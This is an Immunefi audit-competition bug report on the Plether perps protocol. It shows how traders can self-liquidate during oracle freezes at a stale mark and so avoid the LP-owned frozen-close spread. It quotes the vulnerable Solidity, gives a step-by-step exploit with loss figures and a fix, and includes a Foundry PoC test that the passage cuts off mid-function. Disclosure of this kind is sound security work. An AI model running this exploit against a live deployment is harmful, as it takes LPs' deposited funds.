# \#98709 [SC-Medium] Trader-controllable liquidation eligibility during oracle freeze lets traders self-liquidate at the stale Friday mark, bypassing the LP-owned frozen-close spread and leading to griefing of LPs

**Submitted on Nov 9th 2026 at 17:54:51 UTC by @Abhan for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98709
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
During oracle-frozen windows (weekends/holidays) the protocol only lets traders exit at the stale Friday mark after paying a fixed, LP-owned 50 bps frozen-close spread plus the 4 bps execution fee, while liquidations skip both on the premise that they are involuntary. That premise fails: a trader can decide when their own healthy account becomes liquidatable during the freeze, either by withdrawing all free settlement so carry becomes uncovered, or by letting pledge-first carry cross the 3% FAD margin while timing ungated addMargin top-ups. They then call the permissionless executeLiquidation, which also pays the keeper share back to the trader, and exit at the stale mark for about 7.5 bps instead of the designed 54 bps. In production this gives every qualifying trader a free option on each weekend's FX move, paid for by LPs: in the PoC (release parameters, public V3 router), an adverse 50 bps weekend gap lets the trader take 1,066.32 USDG (28.63 bps of notional) of LP cash, and a delta-neutral hedged pair earns 62.10 bps of one leg over holding while LPs lose 58.08 bps. The attack repeats on every freeze.

## Vulnerability Details
During an oracle freeze the protocol offers traders one designed exit: an oracle-frozen voluntary close at the stale Friday mark. `CloseAccountingLib.buildCloseState` charges it the 4 bps execution fee plus a fixed 50 bps frozen-close spread, and that spread is LP revenue:

```solidity
// CloseAccountingLib.sol L120-L126 (buildCloseState)
uint256 notionalAssets = (inputs.sizeDelta * inputs.oraclePrice) / CfdMath.ASSETS_TO_TOKEN_SCALE;
state.executionFeeAssets = (notionalAssets * inputs.executionFeeBps) / 10_000;
if (inputs.oracleFrozen) {
    state.frozenSpreadAssets = (notionalAssets * inputs.frozenCloseSpreadBps) / 10_000;
}
state.netSettlementAssets = state.realizedPnlAssets - state.vpiDeltaAssets
    - int256(state.executionFeeAssets + state.frozenSpreadAssets);
```

A liquidation during the same freeze is much cheaper. `PletherOracle._frozenBasket` reuses the Engine's stored Friday mark with a fixed 10 bps confidence. Under the release `adverseConfidenceMultiplierBps` of 2,500, that becomes a 2.5 bps adverse shift. No Pyth payload or fee is needed, and the stored mark stays usable for `fadMaxStaleness` (3 days):

```solidity
// PletherOracle.sol L729-L743 (_frozenBasket)
basket.price = engine.lastMarkPrice();
basket.publishTime = engine.lastMarkTime();
...
// Liquidations receive a deterministic, conservative confidence shift while Pyth is closed.
basket.confidence = basket.price * basketMaxConfidenceRatioBps / 10_000;
```

`CfdEnginePlanLib._applyLiquidationSettlement` (L1488-L1551) pays the trader's unrealised profit in full. It takes only the 10 bps liquidation charge from the dedicated liquidation reserve, and it computes no spread, no execution fee and no fresh close VPI. `executeLiquidation` is permissionless, and the router passes `msg.sender` as the keeper without checking it against `account`. The clearinghouse then credits the keeper share to that address:

```solidity
// OrderLiquidationBatchLogic.sol L727-L729 (executeLiquidation)
host.executeLiquidationBatchItem(
    account, snapshot.price, snapshot.price, snapshot.markPrice, snapshot.publishTime, msg.sender, riskOffCutoff
);
```

```solidity
// MarginClearinghouse.sol L1264-L1269 (_applyLiquidationSettlementPlan)
if (execution.keeperBountyAssets > 0) {
    ...
    settlementBalances[execution.keeper] += execution.keeperBountyAssets;
```

When the trader liquidates their own account, half of the 10 bps charge comes back to them. The liquidation exit therefore costs about 10 − 5 + 2.5 = 7.5 bps, against 54 bps for the designed frozen close. The protocol accepts that gap only because liquidations are assumed to be involuntary. That assumption is wrong, because a trader can decide when their own healthy account becomes liquidatable during the freeze.

`planLiquidation` first projects pending carry onto the account. It then declares the account liquidatable in two cases: it fails price health, judged on PnL pledge + same-account claim at the 300 bps FAD margin while `isFadWindow`, or any carry cannot be covered:

```solidity
// CfdEnginePlanLib.sol L1440-L1469 (planLiquidation)
delta.pendingCarryAssets = _pendingCarryAssets(snap);
delta.realizedCarryAssets = _applyPendingCarryRealizationToSnapshot(snap, delta.pendingCarryAssets);
pos = snap.position;
...
uint256 maintMarginBps = snap.isFadWindow ? snap.riskParams.fadMarginBps : snap.riskParams.maintMarginBps;
...
delta.riskState = PositionRiskAccountingLib.buildExactPriceRiskState(
    pos,
    snap.positionEntryCostAssetAtoms,
    price,
    snap.capPrice,
    pos.margin + snap.traderClaimBalanceForAccount,
    maintMarginBps
);

if (!delta.riskState.liquidatable && delta.pendingCarryAssets == delta.realizedCarryAssets) {
    return delta;
}
delta.riskState.liquidatable = true;
delta.liquidatable = true;
```

Carry is consumed pledge-first. Only the remainder comes from free settlement, and whatever neither covers is left uncovered:

```solidity
// MarginClearinghouseAccountingLib.sol L95-L107 (planCarryLossConsumption, used by projectCarryLoss)
consumption.activeMarginConsumedAssets =
    buckets.activePositionMarginAssets < lossAssets ? buckets.activePositionMarginAssets : lossAssets;
uint256 remainderAssets = lossAssets - consumption.activeMarginConsumedAssets;
consumption.freeSettlementConsumedAssets =
    buckets.freeSettlementAssets < remainderAssets ? buckets.freeSettlementAssets : remainderAssets;
...
consumption.uncoveredAssets = lossAssets - consumption.totalConsumedAssets;
```

The trader can steer both branches. The first lever is uncovered carry on demand. Once carry has eroded a position's PnL pledge, later carry is paid from free settlement. The withdrawal guard in `CfdEngineSettlementSidecar.validateWithdraw` checks only the state at that instant: no carry arrears right now, a funded VPI reserve, and price health on pledge + claim. It never requires the account to keep any carry runway:

```solidity
// CfdEngineSettlementSidecar.sol L283-L305 (validateWithdraw / _requireWithdrawPositionHealthy)
host.settlementRealizeCarry(account);
_requireWithdrawPositionHealthy(engine, host, account, price);
...
function _requireWithdrawPositionHealthy(...) private view {
    CfdTypes.Position memory pos = _loadPosition(engine, account);
    if (engine.unsettledCarryAssets(account) != 0) {
        revert ICfdEngineTypes.CfdEngine__WithdrawBlockedByOpenPosition();
    }
    IMarginClearinghouse clearinghouse = IMarginClearinghouse(host.clearinghouse());
    if (clearinghouse.vpiRebateReserveAssets(account) < _negativeVpiReserveTarget(pos.vpiAccrued)) {
        revert ICfdEngineTypes.CfdEngine__WithdrawBlockedByOpenPosition();
    }
    uint256 reachableAssets = clearinghouse.pnlPledgeAssets(account) + engine.traderClaimBalanceAssets(account);
    if (_withdrawPositionLiquidatable(engine, pos, account, price, reachableAssets)) {
        revert ICfdEngineTypes.CfdEngine__WithdrawBlockedByOpenPosition();
    }
}
```

A price-healthy trader whose pledge is exhausted can therefore withdraw all free settlement during the freeze. Seconds later, carry accrues with nothing to cover it. `planLiquidation` then reports the account liquidatable while its price health is fine, and the trader calls `executeLiquidation(self, [])`. Getting there takes no special setup. A position opened at the 20 bps initial margin has its pledge consumed by carry (5%/yr at 100% side utilisation `U`) in about `14.6 / U` days, for example 39 days at 37% utilisation. Under `planOpenCostApplication`, an increase whose `marginDelta` covers only fee + VPI + reserve adds no pledge, so notional can grow while the pledge stays flat, which shortens that time.

The second lever needs no withdrawal and no holding period. While frozen, FAD health applies at 300 bps. `_applyPendingCarryRealizationToSnapshot` (L614-L643) takes pending carry out of the pledge first even when free settlement is available, and health is then evaluated on that reduced pledge (L1450 and L1456-L1463). A position that enters the freeze within roughly one weekend of carry above the FAD margin therefore becomes liquidatable at a time anyone can compute. In the PoC, 28 USDG above the margin on 390,000 notional (0.7 bps) crosses after 32 hours. Free settlement stays positive and `unsettledCarryAssets` stays 0, so the trigger is plain price health. The trader controls the timing, because `addMargin` is not gated by the freeze:

```solidity
// CfdEngine.sol L501-L521 (addMargin): owner-only, no oracleFrozen / FAD check
function addMargin(address account, uint256 amount) external nonReentrant {
    if (msg.sender != account) revert CfdEngine__NotAccountOwner();
    ...
    _realizeCarryFromSettlement(account, pos);
    uint256 marginBefore = _positionMarginBucketAssets(account);
    clearinghouse.lockPositionMargin(account, amount);
```

The trader postpones the crossing with small top-ups and stops once the weekend information is known. If the news is bad for the position, it crosses and is liquidated at the Friday mark, by the trader or by any third-party keeper. If the news is good, the trader keeps topping up and holds. Opens are blocked during FAD, but margin can still be raised. The trader therefore only needs to bring the pledge into the band before the freeze, and a capital-efficient trader holding the FAD minimum is already in it. Fixes that gate only on carry arrears, or on `keeper == account`, do not close this lever.

Neither lever needs anything unusual. The position must be price-healthy at the FAD margin, through unrealised profit or a same-account trader claim, or enter the freeze just above it, and the engine must not be in degraded mode, which blocks trader withdrawals while a position is open. In the lever-1 sequence from the PoC, Alice is LONG 390,000 tokens, opened at 1.00. The basket moves to 0.955, and since a LONG here profits when the basket falls, she is +4.5%. Carry erodes her pledge over about 45 days. The last live mark before the weekend is 0.955. On Saturday, with `oracleFrozen` set and Alice still healthy, she withdraws all free settlement, and the guard passes on price health. Sixty seconds later `isLiquidatableAt` returns `true` because carry is uncovered. Alice calls `router.executeLiquidation(alice, [])` with no Pyth payload and no fee. The position settles at the frozen mark + 2.5 bps, the 10 bps charge comes from her liquidation reserve, and 5 bps of it is credited back to her as keeper. No spread, no execution fee and no close VPI are charged.


## Impact Details
The funds at risk are the LPs' (Senior and Junior) USDG held by `HousePool`. Each time a trader uses either lever, the pool receives less cash than under either honest outcome: the trader holding through the weekend, or the designed frozen voluntary close. The trader keeps the difference, and the treasury loses the execution fee. This is the in-scope Medium impact "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)". The 50 bps frozen-close spread is the protection LPs are promised against stale-price exits. Any trader can remove it whenever they choose, and LPs absorb the weekend price gap that the spread was meant to price.

All figures below come from the runnable test in the Proof of Concept section. It runs with the release parameters from `DEPLOYMENT.md` and sends every open and voluntary close through the production V3 router. It compares each exit from the same EVM snapshot on the same clock, in a ~1,000,000 USDG Junior pool.

In the lever-1 case, Alice is LONG 390,000 tokens, which is 372,450 USDG of notional at the frozen 0.955 mark. Suppose the market reopens on Monday 50 bps against her. If she holds and closes live on Monday, she ends with 34,314.49 USDG. If she uses the designed frozen voluntary close on Saturday, she ends with 34,340.00 USDG, which is break-even with holding: the spread does its job. If she self-liquidates on Saturday, she ends with **35,380.82 USDG**. That beats holding by **1,066.32 USDG (28.63 bps of notional)**, and LP pool cash is lower by the same **1,066.32 USDG**. Against the designed exit, Alice gains 1,040.82 USDG (27.94 bps), LPs lose **891.84 USDG (23.94 bps)** and the treasury loses the 148.98 USDG execution fee. Of Alice's gain, 186.27 USDG is the keeper share she credits to herself, which is exactly what a third-party keeper would have received. If the market instead reopens 50 bps in her favour, she simply holds and ends with 38,026.66 USDG. The attack is therefore a free option on every weekend's FX move, paid for by LPs, and it is available for every qualifying position on every weekend and holiday freeze.

The design gap between the two exits is 54 bps minus about 7.5 bps, or 46.5 bps. The measured saving is smaller because Alice is the only trader in this pool: a voluntary close would refund part of her own opening VPI through the lifetime clamp, while liquidation forfeits it to LPs. When a position does not itself create the skew, the saving approaches the full design gap.

Lever 2 needs no holding period and no withdrawal. A 390,000-token LONG that enters the freeze 28 USDG above the FAD margin becomes liquidatable 32 hours into the freeze from carry alone, while it still has 16,966.82 USDG of free settlement and no carry arrears. A frozen voluntary close would leave the trader 27,709.11 USDG. Self-liquidation leaves **28,764.22 USDG** (+1,055.11, 27.05 bps), and LPs lose **899.11 USDG (23.05 bps)**. If a third-party keeper performs the liquidation instead, the trader still gains 860.11 USDG and LPs still lose 899.11 USDG, so the harm does not depend on the self-keeper bounty. A single 50 USDG `addMargin` one hour before the crossing keeps the account healthy for the rest of the freeze, so whether the crossing happens is the trader's choice.

The most damaging use is a hedged pair. One owner holds a 300,000-token LONG and a 300,000-token SHORT, both entering the freeze 10 USDG above the FAD margin. Weekend information shows the market will reopen 50 bps higher, which hurts the LONG. If the owner holds the hedge and closes both legs live on Monday, they end with 58,566.33 USDG across both accounts. The designed frozen close of the losing LONG leaves them only 28.14 USDG better off, because the spread neutralises the option. If instead the owner tops up only the SHORT, lets carry push the LONG over the FAD margin after 19 hours, self-liquidates the LONG at the Friday mark and closes the SHORT on Monday, they end with **60,429.36 USDG**. That is **+1,863.03 USDG (62.10 bps of one leg's notional)** over holding, while LPs lose **1,742.43 USDG (58.08 bps)** against holding and 1,714.89 USDG against the designed exit. A market-neutral position thus becomes a repeatable weekend bet against LPs. That is about $5,800 of LP loss per $1M of leg notional for each 50 bps gap, and it scales linearly with position size up to the skew and capacity limits.

Every LP loses in proportion to their share of the pool, on every weekend and holiday freeze, whenever a trader uses the bypass. The trader profits net of about 7.5 bps per use. The losses are deposited LP capital and forgone spread revenue that LPs are promised as protection. The report does not claim theft of a previously accrued, unclaimed yield balance.

## Recommendation
Make freeze-period liquidations cost at least as much as the designed frozen exit: charge the frozen-close spread and the execution fee on liquidations executed while `oracleFrozen`. Alternatively, do not settle freeze-period liquidations of accounts that were healthy at the freeze at the stale mark; defer them to the live reopen, and judge FAD health during the freeze on the pledge as it stood at the freeze. This closes both levers. Also require withdrawals with an open position to leave a minimum carry runway, so an account cannot be pushed into uncovered carry on demand, and pay no keeper share when the keeper is the liquidated account.


## References
- Liquidation eligibility from price health or uncovered carry: [CfdEnginePlanLib.sol#L1424-L1471](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol?plain=1#L1424-L1471)
- Pledge-first carry projection that pushes the account over the FAD margin: [CfdEnginePlanLib.sol#L614-L643](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol?plain=1#L614-L643)
- Withdrawal guard with no carry runway: [CfdEngineSettlementSidecar.sol#L255-L305](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol?plain=1#L255-L305)
- Frozen-close spread charged on voluntary closes only: [CloseAccountingLib.sol#L120-L126](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol?plain=1#L120-L126)
- Liquidation settlement with no spread, fee or close VPI: [CfdEnginePlanLib.sol#L1488-L1551](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol?plain=1#L1488-L1551)
- Frozen liquidation price is the stale Engine mark: [PletherOracle.sol#L729-L743](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol?plain=1#L729-L743)
- Permissionless liquidation with `msg.sender` as keeper: [OrderLiquidationBatchLogic.sol#L706-L730](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol?plain=1#L706-L730)
- `addMargin` not gated by the freeze: [CfdEngine.sol#L501-L521](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol?plain=1#L501-L521)



## Proof of Concept

## Proof of Concept

The vulnerability is demonstrated by a runnable Foundry test against the audit repository, `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The complete test code is included at the end of this section.

The test extends the repository's own `BasePerpTest` harness (`packages/perps/test/perps/BasePerpTest.sol`) and does not modify any contract under `src/`. The only mocks are the repository's Pyth and USDG test contracts. `BasePerpTest` deploys the repository's `LegacyOrderRouterHarness`, which inherits the production `OrderRouter` unchanged and only adds a test-only scalar commit overload that this test never calls. Every open and voluntary close goes through the production V3 entry point `IPerpsTraderActions.commitOrder(OrderRequest)` and is executed by an arbitrary keeper address. The attack uses only the public `clearinghouse.withdraw`, `engine.addMargin` and `router.executeLiquidation`, and no protocol contract is impersonated.

The test applies the release parameters from `DEPLOYMENT.md`: `vpiFactor` 0.01e18, `maxSkewRatio` 0.4, 10/20/300 bps maintenance/initial/FAD margins, 5% base carry, 10 bps liquidation charge with a 50% keeper share, 4 bps execution fee, 50 bps frozen-close spread, 10 bps maximum confidence and 2,500 bps adverse multiplier. Each exit is compared with the alternatives from the same EVM snapshot on the same clock. The freeze is located with the engine's own `isOracleFrozen()` calendar.

### Step-by-step (`test_Lever1_SelfLiquidationVsFrozenCloseVsHolding`)

1. **Setup.** Alice opens a 390,000-token LONG at 1.00 with 2,200 USDG margin, which leaves an 895.02 USDG PnL pledge. The basket moves to 0.955. A LONG here profits when the basket falls, so Alice is +4.5%. The clock advances 45 days, and carry, collected pledge-first, erodes the pledge.
2. **Friday, 30 min before the freeze:** the last live mark of the week, 0.955, is accepted.
3. **Saturday (freeze + 12 h):** `engine.isOracleFrozen()` is `true` and Alice is not liquidatable. The state is snapshotted.
4. **Designed exit (b):** Alice closes through the V3 router at the frozen mark and pays the 4 bps fee and the 50 bps spread (148.98 + 1,862.25 USDG on 372,450 notional). After withdrawing she holds **34,340.00 USDG**.
5. **Attack (c):** from the same snapshot, Alice calls `clearinghouse.withdraw` for all her free settlement. `validateWithdraw` requires no carry runway, so it passes, and the account is still not liquidatable. Sixty seconds later the new carry is uncovered, `isLiquidatableAt` returns `true`, and the market is still frozen. Alice calls `router.executeLiquidation(alice, [])` with no Pyth payload. The position settles at the stale mark + 2.5 bps, with no spread, fee or close VPI, and Alice receives the keeper share herself. She holds **35,380.82 USDG**.
6. **Third-party keeper (k):** the same liquidation called by another address leaves Alice 35,194.55 USDG and pays that keeper 186.27 USDG. That is exactly `c − k`, so in (c) Alice paid the keeper share to herself.
7. **Holding (a)/(f):** from the same snapshot, the market reopens on Monday 50 bps against Alice (0.959775) or in her favour (0.950225), and she closes live. She ends with 34,314.49 or 38,026.66 USDG.
8. **Result:** compared with the designed exit, Alice gains **1,040.82 USDG**, LP pool cash is **891.84 USDG** lower and the treasury loses the 148.98 USDG fee. Compared with holding through the adverse gap, Alice gains **1,066.32 USDG (28.63 bps)** and LPs lose the same amount. With a favourable gap she holds instead, so the attack is a free option.

### Other scenarios covered by the test

| Test | What it shows | Result |
| --- | --- | --- |
| `test_Lever2_CarryCrossesFadMargin_SelfAndThirdPartyLiquidation` | Position enters the freeze 28 USDG above the 3% FAD margin; carry alone makes it liquidatable while free settlement > 0 and `unsettledCarryAssets` = 0 | Crosses after 32 h; trader +1,055.11 vs frozen close, LPs −899.11; with a third-party keeper trader +860.11, LPs −899.11 |
| `test_Lever2_TopUpPostponesCrossing` | A 50 USDG `addMargin` one hour before the crossing, during the freeze | Not liquidatable at the crossing hour and healthy for the rest of the freeze |
| `test_Lever2_HedgedPairBecomesStalePriceChooser` | LONG + SHORT 300,000 each; reopen gaps +50 bps; only the SHORT is topped up | Hold hedge 58,566.33; designed frozen close of the loser +28.14; self-liquidation of the loser **+1,863.03**, LPs **−1,742.43** |

### How to run

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
# save the test code below as packages/perps/test/poc/FrozenSelfLiquidationSpreadBypass.t.sol
cd packages/perps
FOUNDRY_TEST=test/poc FOUNDRY_SCRIPT=test/poc forge test --match-path test/poc/FrozenSelfLiquidationSpreadBypass.t.sol -vv
```

The two `FOUNDRY_*` variables limit compilation to the PoC. The package builds with via-IR, so compiling its whole test suite takes much longer; running without them also works. Expected result: `Suite result: ok. 4 passed; 0 failed; 0 skipped`, with the values above in the logs.

### PoC code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {console2} from "forge-std/console2.sol";

/// @title Frozen-window liquidation eligibility is trader-controllable
/// @notice During an oracle-frozen window a trader can make its own healthy account liquidatable through carry
///         accounting (lever 1: withdraw all free settlement so carry becomes uncovered; lever 2: let pledge-first
///         carry cross the 3% FAD margin) and exit at the stale Friday mark through liquidation. Liquidation skips the
///         LP-owned 50 bps frozen-close spread, the 4 bps execution fee and fresh close VPI, and credits the keeper
///         share to `msg.sender` even when that is the liquidated account.
/// @dev Every open and voluntary close enters through the production V3 `IPerpsTraderActions.commitOrder(OrderRequest)`
///      and is executed by an untrusted keeper. The attack uses only public `clearinghouse.withdraw`,
///      `engine.addMargin` and `router.executeLiquidation`. Release parameters from `packages/perps/DEPLOYMENT.md`.
///      Every exit is compared with the alternatives from the same EVM snapshot on the same clock.
contract FrozenSelfLiquidationSpreadBypassTest is BasePerpTest {

    address internal constant ALICE = address(0xA11CE); // lever 1 trader
    address internal constant CAROL = address(0xCA201); // lever 2 trader
    address internal constant HEDGE_LONG = address(0x10A6); // lever 2 hedged pair, LONG leg
    address internal constant HEDGE_SHORT = address(0x5A0E); // lever 2 hedged pair, SHORT leg (same owner)
    address internal constant KEEPER = address(0x4EE9); // untrusted third party

    uint256 internal constant SIZE = 390_000e18; // just under the 40% skew cap of the ~1M Junior pool
    uint256 internal constant HEDGE_SIZE = 300_000e18;

    struct Outcome {
        uint256 traderValue; // clearinghouse balance + wallet + trader claim
        uint256 poolAssets;
        uint256 treasury;
    }

    // ------------------------------------------------------------------------------------------------------------
    // Release configuration
    // ------------------------------------------------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(config);
        // The timelock warps above can end inside the weekend market closure; resume on a Monday 10:00 UTC.
        vm.warp(SETUP_TIMESTAMP + 7 days);
        assertFalse(engine.isOracleFrozen(), "regular trading hours");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozen-close spread");
        assertEq(engine.fadMaxStaleness(), 3 days, "release frozen staleness");
        assertEq(router.pletherOracle().basketMaxConfidenceRatioBps(), 10, "release confidence cap");
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "release adverse multiplier");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "release minimum open notional");
    }

    // ------------------------------------------------------------------------------------------------------------
    // Production entry points
    // ------------------------------------------------------------------------------------------------------------

    function _commit(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        // Open LONG / close SHORT accept prices at or above the target; open SHORT / close LONG at or below it.
        bool acceptAbove = (side == CfdTypes.Side.LONG) != isClose;
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(account, router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: acceptAbove ? 1 : CAP_PRICE,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        IPerpsTraderActions(address(router)).commitOrder(request);
        vm.prank(KEEPER);
        router.executeOrder(router.nextExecuteId(), _mockPythUpdateData(engine.lastMarkPrice()));
    }

    function _size(
        address acct
    ) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(acct);
    }

    function _open(
        address acct,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        _commit(acct, side, size, margin, false);
        require(_size(acct) == size, "open failed");
    }

    function _voluntaryClose(
        address acct,
        CfdTypes.Side side,
        uint256 size
    ) internal {
        _commit(acct, side, size, 0, true);
        require(_size(acct) == 0, "close failed");
    }

    function _liquidate(
        address caller,
        address acct
    ) internal {
        bytes[] memory empty = new bytes[](0); // no Pyth payload and no fee while frozen
        vm.prank(caller);
        router.executeLiquidation(acct, empty);
        require(_size(acct) == 0, "liquidation failed");
    }

    function _withdrawAllFree(
        address acct
    ) internal {
        vm.prank(acct);
        clearinghouse.withdraw(acct, 1); // realizes carry first
        IMarginClearinghouse.AccountAssetBuckets memory b = clearinghouse.getAccountAssetBuckets(acct);
        if (b.freeSettlementAssets > 0) {
            vm.prank(acct);
            clearinghouse.withdraw(acct, b.freeSettlementAssets);
        }
    }

    // ------------------------------------------------------------------------------------------------------------
    // Views and clock helpers
    // ------------------------------------------------------------------------------------------------------------

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _mark(
        uint256 price
    ) internal {
        router.updateMarkPrice(_mockPythUpdateData(price));
    }

    /// Steps forward in 15-minute increments (on a reverted snapshot) to find when `frozen`/`fad` next turns on.
    function _nextStart(
        bool wantFrozen
    ) internal returns (uint256 t) {
        uint256 snap = vm.snapshotState();
        for (uint256 i; i < 4 * 24 * 9; ++i) {
            if (wantFrozen ? engine.isOracleFrozen() : engine.isFadWindow()) {
                t = _now();
                break;
            }
            vm.warp(_now() + 15 minutes);
        }
        vm.revertToState(snap);
        require(t != 0, "window not found");
    }

    function _nextLiveOpen() internal returns (uint256 t) {
        uint256 snap = vm.snapshotState();
        for (uint256 i; i < 4 * 24 * 9; ++i) {
            if (!engine.isOracleFrozen() && !engine.isFadWindow()) {
                t = _now();
                break;
            }
            vm.warp(_now() + 15 minutes);
        }
        vm.revertToState(snap);
        require(t != 0, "live window not found");
    }

    function _pledge(
        address acct
    ) internal view returns (uint256) {
        return clearinghouse.getAccountAssetBuckets(acct).activePositionMarginAssets;
    }

    function _liq(
        address acct
    ) internal view returns (bool) {
        return engineLens.isLiquidatableAt(acct, engine.lastMarkPrice(), pool.totalAssets());
    }

    function _value(
        address acct
    ) internal view returns (uint256) {
        return
            clearinghouse.balanceAssets(acct) + settlementToken.balanceOf(acct) + engine.traderClaimBalanceAssets(acct);
    }

    function _outcome(
        address acct
    ) internal view returns (Outcome memory o) {
        o.traderValue = _value(acct);
        o.poolAssets = pool.totalAssets();
        o.treasury = clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    function _notional(
        uint256 size
    ) internal view returns (uint256) {
        return size * engine.lastMarkPrice() / 1e20;
    }

    /// bps x100 of `notional`
    function _bps(
        int256 v,
        uint256 notional
    ) internal pure returns (int256) {
        return v * 1_000_000 / int256(notional);
    }

    function _hoursUntilLiquidatable(
        address acct
    ) internal returns (uint256 h) {
        while (!_liq(acct) && h < 48) {
            vm.warp(_now() + 1 hours);
            ++h;
        }
    }

    // ------------------------------------------------------------------------------------------------------------
    // Lever 1: uncovered carry after withdrawing all free settlement
    // ------------------------------------------------------------------------------------------------------------

    /// Profitable LONG (basket 1.00 -> 0.955, LONG profits when the basket falls), pledge eroded by carry over
    /// ~7 weeks, last live mark of the week 0.955, then Saturday of the freeze.
    function _lever1Setup() internal {
        _fundTrader(ALICE, 20_000e6);
        _open(ALICE, CfdTypes.Side.LONG, SIZE, 2200e6);
        console2.log("lever 1 pledge after open (atoms)", _pledge(ALICE));
        _mark(0.955e8);
        vm.warp(_now() + 45 days);
        uint256 fz = _nextStart(true);
        vm.warp(fz - 30 minutes); // FAD runway, oracle still live: last live mark of the week
        _mark(0.955e8);
        vm.warp(fz + 12 hours); // Saturday, oracleFrozen
        assertTrue(engine.isOracleFrozen(), "frozen");
        assertFalse(_liq(ALICE), "healthy before the lever");
    }

    function test_Lever1_SelfLiquidationVsFrozenCloseVsHolding() public {
        _lever1Setup();
        uint256 notional = _notional(SIZE);
        console2.log("notional at frozen mark (USDG atoms)", notional);
        console2.log("designed frozen-close spread, 50 bps (atoms)", notional * 50 / 10_000);
        console2.log("designed execution fee, 4 bps (atoms)", notional * 4 / 10_000);
        uint256 snap = vm.snapshotState();

        // (b) designed exit: frozen voluntary close (4 bps fee + 50 bps LP spread), then withdraw.
        _voluntaryClose(ALICE, CfdTypes.Side.LONG, SIZE);
        _withdrawAllFree(ALICE);
        Outcome memory b = _outcome(ALICE);
        vm.revertToState(snap);

        // (c) lever 1: withdraw all free settlement (the guard passes on price health), wait 60 s, self-liquidate.
        _withdrawAllFree(ALICE);
        assertEq(clearinghouse.getAccountAssetBuckets(ALICE).freeSettlementAssets, 0, "all free settlement withdrawn");
        assertFalse(_liq(ALICE), "still healthy right after the withdrawal");
        vm.warp(_now() + 60);
        assertTrue(_liq(ALICE), "60 s of uncovered carry makes the price-healthy account liquidatable");
        assertTrue(engine.isOracleFrozen(), "still frozen");
        uint256 snapLiq = vm.snapshotState();
        _liquidate(ALICE, ALICE);
        Outcome memory c = _outcome(ALICE);
        vm.revertToState(snapLiq);

